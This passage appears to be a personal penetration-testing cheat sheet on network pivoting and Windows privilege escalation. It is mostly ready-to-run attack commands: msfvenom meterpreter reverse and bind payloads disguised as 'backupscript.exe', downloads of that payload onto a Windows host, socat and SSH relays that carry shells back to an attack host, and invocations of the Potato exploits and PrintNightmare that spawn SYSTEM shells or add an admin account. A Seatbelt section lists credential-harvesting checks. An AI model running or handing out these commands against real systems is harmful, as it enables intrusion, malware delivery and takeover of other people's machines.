This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.

Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
```
proxychains msfconsole
```
Let's use the rdp_scanner auxiliary module to check if the host on the internal network is listening on 3389.
```
search rdp_scanner
```

Depending on the level of access we have to this host during an assessment, we may try to run an exploit or log in using gathered credentials. For example, we can log in to the Windows remote host over the SOCKS tunnel. This can be done using xfreerdp. 

### Remote-Reverse Port Forwarding with SSH
We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. But sometimes, we might want to forward a local service to the remote port as well.

Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the scp command since we already have the credentials to connect to the Ubuntu server using SSH.

Transferring Payload to Pivot Host
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:/backupscript.exe  
```

Starting Python3 Webserver on Pivot Host

After copying the payload, we will start a python3 HTTP server using the below command on the Ubuntu server in the same directory where we copied our payload.

```
python3 -m http.server 8123
```

We can download this backupscript.exe from the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.
```
Invoke-WebRequest -Uri "http://<ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
```


Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward our msfconsole's listener service on port 8000 to the Ubuntu server's port 8080. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

## Socat Redirection with a Reverse Shell 

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

Starting Socat Listener

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Creating the Windows Payload

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.


## Socat Redirection with a Bind Shell

Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. 

We can create a bind shell using msfvenom with the below command.

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```


We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)


## SSH for Windows plink exe

Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018, Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY.
```
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
```
https://www.putty.org/
```

Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer. 

That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.


The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

Using Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```

Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

```
https://www.proxifier.com/
```

After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.


port 2805 is an example:
```
echo y|&./plink -R 2805:127.0.0.1:2805 -l <your username> -pw <your passwd> <your ip>
```
  
obs: make sure your ssh is open/started
```
sudo systemctl start ssh
```
the echo y is required the first time we run plink to tell it to accept the
ssh key of the server. The -R 2805:127.0.0.1:2805 is necessary to
bypass the local firewall and access veeam from your attacker
machine.
  
  
## SSH Pivoting with Sshuttle

Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts.
```
sudo apt-get install sshuttle
```
```
https://github.com/sshuttle/sshuttle
```


To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.


We can now use any tool directly without using proxychains.


## Web Server Pivoting with Rpivot
```
https://github.com/klsecservices/rpivot
```
Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

Cloning rpivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
```
```
sudo git clone https://github.com/klsecservices/rpivot.git
```

Installing Python2.7
```
sudo apt-get install python2.7
```


We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```


Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
```
scp -r rpivot <user>@<IpaddressOfTarget>:/home/<user>/
```

Running client.py from Pivot Target
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which for an example is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

Browsing to the Target Webserver using Proxychains
```
proxychains firefox-esr 172.16.5.135:80
```


Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
 

## Privilige Escalation
  
## seatbelt
Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. 
```
https://github.com/GhostPack/Seatbelt
```
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt
```

Available commands (+ means remote usage is supported):

    + AMSIProviders          - Providers registered for AMSI
    + AntiVirus              - Registered antivirus (via WMI)
    + AppLocker              - AppLocker settings, if installed
      ARPTable               - Lists the current ARP table and adapter information (equivalent to arp -a)
      AuditPolicies          - Enumerates classic and advanced audit policy settings
    + AuditPolicyRegistry    - Audit settings via the registry
    + AutoRuns               - Auto run executables/scripts/programs
      Certificates           - Finds user and machine personal certificate files
      CertificateThumbprints - Finds thumbprints for all certificate store certs on the systen
    + ChromiumBookmarks      - Parses any found Chrome/Edge/Brave/Opera bookmark files
    + ChromiumHistory        - Parses any found Chrome/Edge/Brave/Opera history files
    + ChromiumPresence       - Checks if interesting Chrome/Edge/Brave/Opera files exist
    + CloudCredentials       - AWS/Google/Azure/Bluemix cloud credential files
    + CloudSyncProviders     - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive.
      CredEnum               - Enumerates the current user's saved credentials using CredEnumerate()
    + CredGuard              - CredentialGuard configuration
      dir                    - Lists files/folders. By default, lists users' downloads, documents, and desktop folders (arguments == [directory] [maxDepth] [regex] [boolIgnoreErrors]
    + DNSCache               - DNS cache entries (via WMI)
    + DotNet                 - DotNet versions
    + DpapiMasterKeys        - List DPAPI master keys
      Dsregcmd               - Return Tenant information - Replacement for Dsregcmd /status
      EnvironmentPath        - Current environment %PATH$ folders and SDDL information
    + EnvironmentVariables   - Current environment variables
    + ExplicitLogonEvents    - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days.
      ExplorerMRUs           - Explorer most recently used files (last 7 days, argument == last X days)
    + ExplorerRunCommands    - Recent Explorer "run" commands
      FileInfo               - Information about a file (version information, timestamps, basic PE info, etc. argument(s) == file path(s)
    + FileZilla              - FileZilla configuration files
    + FirefoxHistory         - Parses any found FireFox history files
    + FirefoxPresence        - Checks if interesting Firefox files exist
    + Hotfixes               - Installed hotfixes (via WMI)
      IdleTime               - Returns the number of seconds since the current user's last input.
    + IEFavorites            - Internet Explorer favorites
      IETabs                 - Open Internet Explorer tabs
    + IEUrls                 - Internet Explorer typed URLs (last 7 days, argument == last X days)
    + InstalledProducts      - Installed products via the registry
      InterestingFiles       - "Interesting" files matching various patterns in the user's folder. Note: takes non-trivial time.
    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
      InternetSettings       - Internet settings including proxy configs and zones configuration
    + KeePass                - Finds KeePass configuration files
    + LAPS                   - LAPS settings, if installed
    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
      LocalGPOs              - Local Group Policy settings applied to the machine/local users
    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
    + LogonEvents            - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days.
    + LogonSessions          - Windows logon sessions
      LOLBAS                 - Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system. Note: takes non-trivial time.
    + LSASettings            - LSA settings (including auth packages)
    + MappedDrives           - Users' mapped drives (via WMI)
      McAfeeConfigs          - Finds McAfee configuration files
      McAfeeSiteList         - Decrypt any found McAfee SiteList.xml configuration files.
      MicrosoftUpdates       - All Microsoft updates (via COM)
      NamedPipes             - Named pipe names, any readable ACL information and associated process information.
    + NetworkProfiles        - Windows network profiles
    + NetworkShares          - Network shares exposed by the machine (via WMI)
    + NTLMSettings           - NTLM authentication settings
      OfficeMRUs             - Office most recently used file list (last 7 days)
      OneNote                - List OneNote backup files
    + OptionalFeatures       - List Optional Features/Roles (via WMI)
      OracleSQLDeveloper     - Finds Oracle SQLDeveloper connections.xml files
    + OSInfo                 - Basic OS info (i.e. architecture, OS version, etc.)
    + OutlookDownloads       - List files downloaded by Outlook
    + PoweredOnEvents        - Reboot and sleep schedule based on the System event log EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
    + PowerShell             - PowerShell versions and security settings
    + PowerShellEvents       - PowerShell script block logs (4104) with sensitive data.
    + PowerShellHistory      - Searches PowerShell console history files for sensitive regex matches.
      Printers               - Installed Printers (via WMI)
    + ProcessCreationEvents  - Process creation logs (4688) with sensitive data.
      Processes              - Running processes with file info company names that don't contain 'Microsoft', "-full" enumerates all processes
    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
    + PSSessionSettings      - Enumerates PS Session Settings from the registry
    + PuttyHostKeys          - Saved Putty SSH host keys
    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
      RDCManFiles            - Windows Remote Desktop Connection Manager settings files
    + RDPSavedConnections    - Saved RDP connections stored in the registry
    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
    + RDPsettings            - Remote Desktop Server/Client Settings
      RecycleBin             - Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
      reg                    - Registry key values (HKLM\Software by default) argument == [Path] [intDepth] [Regex] [boolIgnoreErrors]
      RPCMappedEndpoints     - Current RPC endpoints mapped
    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
      SearchIndex            - Query results from the Windows Search Index, default term of 'passsword'. (argument(s) == <search path> <pattern1,pattern2,...>
      SecPackageCreds        - Obtains credentials from security packages
      SecurityPackages       - Enumerates the security packages currently available using EnumerateSecurityPackagesA()
      Services               - Services with file info company names that don't contain 'Microsoft', "-full" dumps all processes
    + SlackDownloads         - Parses any found 'slack-downloads' files
    + SlackPresence          - Checks if interesting Slack files exist
    + SlackWorkspaces        - Parses any found 'slack-workspaces' files
    + SuperPutty             - SuperPutty configuration files
    + Sysmon                 - Sysmon configuration from the registry
    + SysmonEvents           - Sysmon process creation logs (1) with sensitive data.
      TcpConnections         - Current TCP connections and their associated processes and services
      TokenGroups            - The current token's local and domain groups
      TokenPrivileges        - Currently enabled token privileges (e.g. SeDebugPrivilege/etc.)
    + UAC                    - UAC system policies via the registry
      UdpConnections         - Current UDP connections and associated processes and services
      UserRightAssignments   - Configured User Right Assignments (e.g. SeDenyNetworkLogonRight, SeShutdownPrivilege, etc.) argument == computername to enumerate
      WifiProfile            - Enumerates the saved Wifi profiles and extract the ssid, authentication type, cleartext key/passphrase (when possible)
    + WindowsAutoLogon       - Registry autologon information
      WindowsCredentialFiles - Windows credential DPAPI blobs
    + WindowsDefender        - Windows Defender settings (including exclusion locations)
    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
      WindowsVault           - Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).
    + WMI                    - Runs a specified WMI query
      WMIEventConsumer       - Lists WMI Event Consumers
      WMIEventFilter         - Lists WMI Event Filters
      WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable


Seatbelt has the following command groups: All, User, System, Slack, Chromium, Remote, Misc

    You can invoke command groups with         "Seatbelt.exe <group>"


    Or command groups except specific commands "Seatbelt.exe <group> -Command"

   "Seatbelt.exe -group=all" runs all commands

   "Seatbelt.exe -group=user" runs the following commands:

        Certificates, CertificateThumbprints, ChromiumPresence, CloudCredentials, CloudSyncProviders,
        CredEnum, dir, DpapiMasterKeys, Dsregcmd,
        ExplorerMRUs, ExplorerRunCommands, FileZilla, FirefoxPresence,
        IdleTime, IEFavorites, IETabs, IEUrls,
        KeePass, MappedDrives, OfficeMRUs, OneNote,
        OracleSQLDeveloper, PowerShellHistory, PuttyHostKeys, PuttySessions,
        RDCManFiles, RDPSavedConnections, SecPackageCreds, SlackDownloads,
        SlackPresence, SlackWorkspaces, SuperPutty, TokenGroups,
        WindowsCredentialFiles, WindowsVault

   "Seatbelt.exe -group=system" runs the following commands:

        AMSIProviders, AntiVirus, AppLocker, ARPTable, AuditPolicies,
        AuditPolicyRegistry, AutoRuns, Certificates, CertificateThumbprints,
        CredGuard, DNSCache, DotNet, EnvironmentPath,
        EnvironmentVariables, Hotfixes, InterestingProcesses, InternetSettings,
        LAPS, LastShutdown, LocalGPOs, LocalGroups,
        LocalUsers, LogonSessions, LSASettings, McAfeeConfigs,
        NamedPipes, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        Processes, PSSessionSettings, RDPSessions, RDPsettings,
        SCCM, Services, Sysmon, TcpConnections,
        TokenPrivileges, UAC, UdpConnections, UserRightAssignments,
        WifiProfile, WindowsAutoLogon, WindowsDefender, WindowsEventForwarding,
        WindowsFirewall, WMI, WMIEventConsumer, WMIEventFilter,
        WMIFilterBinding, WSUS

   "Seatbelt.exe -group=slack" runs the following commands:

        SlackDownloads, SlackPresence, SlackWorkspaces

   "Seatbelt.exe -group=chromium" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ChromiumPresence

   "Seatbelt.exe -group=remote" runs the following commands:

        AMSIProviders, AntiVirus, AuditPolicyRegistry, ChromiumPresence, CloudCredentials,
        DNSCache, DotNet, DpapiMasterKeys, EnvironmentVariables,
        ExplicitLogonEvents, ExplorerRunCommands, FileZilla, Hotfixes,
        InterestingProcesses, KeePass, LastShutdown, LocalGroups,
        LocalUsers, LogonEvents, LogonSessions, LSASettings,
        MappedDrives, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        ProcessOwners, PSSessionSettings, PuttyHostKeys, PuttySessions,
        RDPSavedConnections, RDPSessions, RDPsettings, Sysmon,
        WindowsDefender, WindowsEventForwarding, WindowsFirewall

   "Seatbelt.exe -group=misc" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo, FirefoxHistory,
        InstalledProducts, InterestingFiles, LogonEvents, LOLBAS,
        McAfeeSiteList, MicrosoftUpdates, OutlookDownloads, PowerShellEvents,
        Printers, ProcessCreationEvents, ProcessOwners, RecycleBin,
        reg, RPCMappedEndpoints, ScheduledTasks, SearchIndex,
        SecurityPackages, SysmonEvents


Examples:
    'Seatbelt.exe <Command> [Command2] ...' will run one or more specified checks only
    'Seatbelt.exe <Command> -full' will return complete results for a command without any filtering.
    'Seatbelt.exe "<Command> [argument]"' will pass an argument to a command that supports it (note the quotes).
    'Seatbelt.exe -group=all' will run ALL enumeration checks, can be combined with "-full".
    'Seatbelt.exe -group=all -AuditPolicies' will run all enumeration checks EXCEPT AuditPolicies, can be combined with "-full".
    'Seatbelt.exe <Command> -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run an applicable check remotely
    'Seatbelt.exe -group=remote -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run remote specific checks
    'Seatbelt.exe -group=system -outputfile="C:\Temp\out.txt"' will run system checks and output to a .txt file.
    'Seatbelt.exe -group=user -q -outputfile="C:\Temp\out.json"' will run in quiet mode with user checks and output to a .json file.

## winpeas
Windows Privilege Escalation Awesome Scripts
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```



### sweetpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
download exe binary with:
```
wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
```

Sweet Potato
Sweet Potato is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. It has been created by @EthicalChaos and includes:

RottenPotato

Weaponized JuciyPotato with BITS WinRM discovery

PrintSpoofer discovery and original exploit

EfsRpc built on EfsPotato

PetitPotam

It is the definitelly potatoe, a potatoe to rule them all.

Exploitation
Download the binary from the repository: Here
```
https://github.com/CCob/SweetPotato
```
```
./SweetPotato.exe

  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help
```





### JuicyPotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Juicy Potato
Juicy Potato is Rotten Potato on steroids. It allows a more flexible way to exploit the vulnerability. In this case, ohpe & decoder during a Windows build review found a setup where BITS was intentionally disabled and port 6666 was taken, therefore Rotten Potato PoC won’t work.

What are BITS and CLSID?
CLSID is a globally unique identifier that identifies a COM class object. It is an identifier like UUID.
Background Intelligent Transfer Service (BITS) is used by programmers and system administrators to download files from or upload files to HTTP web servers and SMB file shares. The point is that BITs implements the IMarshal interface and allows the proxy declaration to force the NTLM Authentication.
Rotten Potato’s PoC used BITS with a default CLSID
```
// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
```
They discovered that other than BITS there are several out of process COM servers identified by specific CLSIDs that could be abused. They need al least to:

Be instantiable by the current user, normally a service user which has impersonation privileges
Implement the IMarshal interface
Run as an elevated user (SYSTEM, Administrator, …)
And they found a lot of them: http://ohpe.it/juicy-potato/CLSID/

What are the advantages?
We do not need to have a meterpreter shell
We can specify our COM server listen port
We can specify with CLSID to abuse
Exploitation
Download the binary from the repository: Here
```
https://github.com/ohpe/juicy-potato
```
```
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
Does this still works?
Same case as Rotten potato.

### hotpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```
Hot Potato
Hot Potato was the first potato and was the code name of a Windows privilege escalation technique discovered by Stephen Breen @breenmachine. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012.

How does this works?
![image](https://user-images.githubusercontent.com/24814781/180617915-894293d4-648b-4d5e-924b-e8ed5c9f39fa.png)
  
Therefore, the vulnerability uses the following:

1. Local NBNS Spoofer: To impersonate the name resolution and force the system to download a malicious WAPD configuration.
2. Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the system to perform a NTLM authentication
3. HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to create an elevated process.

Exploitation
Download the binary from the repository: Here  
```
https://github.com/foxglovesec/Potato
```
```
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
```
Is this vulnerability exploitable right now?
Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that SMB->SMB NTLM relay from one host back to itself will no longer work. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched.

  
### rottenpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rotten Potato
Rotten Potato is quite complex, but mainly it uses 3 things:

1. RPC that is running through NT AUTHORITY/SYSTEM that is going to try to authenticate to our local proxy through the CoGetInstanceFromIStorage API Call.
2. RPC in port 135 that is going to be used to reply all the request that the first RPC is performing. It is going to act as a template.
3. AcceptSecurityContext API call to locally impersonate NT AUTHORITY/SYSTEM

![image](https://user-images.githubusercontent.com/24814781/180618032-1a3b4645-5e3b-4339-8859-92cc60d39d08.png)


1. Trick RPC to authenticate to the proxy with the CoGetInstanceFromIStorage API call. In this call the proxy IP/Por t is specified.
2. RPC send a NTLM Negotiate package to the proxy.
3. The proxy relies the NTLM Negotiate to RPC in port 135, to be used as a template. At the same time, a call to AcceptSecurityContext is performed to force a local authentication. Notice that this package is modified to force the local authentication.
4. & 5. RPC 135 and AcceptSecurityContext replies with a NTLM Challenge . The content of both packets are mixed to match a local negotiation and is forwarded to the RPC, step 6..
7. RPC responds with a NLTM Auth package that is send to AcceptSecurityContext (8.) and the impersonation is performed (9.).

 
Exploitation
Download the binary from the repository: Here
```
https://github.com/breenmachine/RottenPotatoNG
```
After having a meterpreter shell with incognito mode loaded:
```
MSFRottenPotato.exe t c:\windows\temp\test.bat
```
Is this vulnerability exploitable right now?
Decoder analyzed if this technique could be exploited in the latest Windows version, in this blog post: https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/

To sum up:

DCOM does not talk to our local listeners, so no MITM and no exploit.

Sending the packets to a host under our control listening on port 135, and then forward the data to our local COM listener does not work. The problem is that in this case, the client will not negotiate a Local Authentication.

Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server 2019

### lonelypotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Lonely Potato
Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module made by Decoder.

https://decoder.cloud/2017/12/23/the-lonely-potato/

Is this vulnerability exploitable right now?
Lonely Potato is deprecated and after visiting the repository, there is an indication to move to Juicy Potato.
```
https://github.com/decoder-it/lonelypotato
```
OBS: just switch to juicypotato or something else!

### roguepotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Rogue Potato
After reading fixes regarding Rotten/Juicy potato, the following conclusions can be drawn:

You cannot specify a custom port for OXID resolver address in latest Windows versions
If you redirect the OXID resolution requests to a remote server on port 135 under your control and the forward the request to your local Fake RPC server, you will obtain only an ANONYMOUS LOGON.
If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an identification token during the IRemUnkown2 interface query.
How does this works?

![image](https://user-images.githubusercontent.com/24814781/180618225-24ffa2fb-bc31-4262-9929-74d6e9c157a6.png)

Rogue Potato instruct the DCOM server to perform a remote OXID query by specifying a remote IP (Attacker IP)
On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake OXID RPC Server
The fake OXID RPC server implements the ResolveOxid2 server procedure, which will point to a controlled Named Pipe [ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]].
The DCOM server will connect to the RPC server in order to perform the IRemUnkown2 interface call. By connecting to the Named Pipe, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
Then, a token stealer will:
Get the PID of the rpcss service
Open the process, list all handles and for each handle try to duplicate it and get the handle type
If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with CreatProcessAsUser() or CreateProcessWithToken()

To dig deeper read the author’s blog post: https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

What do you need to make it work?
You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim
Upload both exe files from the PoC. In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.
More info: https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html

Exploitation
Download the binary from the repository: Here
```
https://github.com/antonioCoco/RoguePotato
```
Run in your machine the socat redirection (replace VICTIM_IP):
```
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```
Execute PoC (replace YOUR_IP and command):
```
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

### genericpotato
```
https://jlajara.gitlab.io/Potatoes_Windows_Privesc  
```

Generic Potato
Wait, another potato? Yes. Generic Potato is a modified version of SweetPotato by @micahvandeusen to support impersonating authentication over HTTP and/or named pipes.

This allows for local privilege escalation from SSRF and/or file writes. It is handy when:

The user we have access to has SeImpersonatePrivilege
The system doesn’t have the print service running which prevents SweetPotato.
WinRM is running preventing RogueWinRM
You don’t have outbound RPC allowed to any machine you control and the BITS service is disabled preventing RoguePotato.
How do we abuse this? All we need is to cause an application or user with higher privileges to authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token and run a command for us as the user running the web server, probably system. More information ca be found here

Exploitation
Download the binary from the repository: Here
```
https://github.com/micahvandeusen/GenericPotato
```
```
.\GenericPotato.exe

  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
  -l, --port=VALUE           HTTP port to listen on (default 8888)
  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
  -h, --help                 Display this help
```

  ## printnightmare 
  CVE-2021-1675
  
  Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) 
  
  ```
  https://github.com/calebstewart/CVE-2021-1675
  ```
  
  easy basic example: 
  ```
  Import-Module .\CVE-2021-1675.ps1
  ```
  ```
  Invoke-Nightmare
  ```
  
  and you will get a output like: 
```
  [+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

  
Notice that our payload mentions creating a new user called adm1n with a password of P@ssw0rd? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
  
We could also take the simple option of right-clicking (if we are in a RDP GUI) on PowerShell or cmd.exe and choosing to "Run as Administrator"
  
We could also use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.
```
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```
  
Run the command "whoami /groups" in the new window. You should see "BUILTIN\Administrators" in the list of groups, and a line at the bottom of the output containing "Mandatory Label\High Mandatory Level".
  

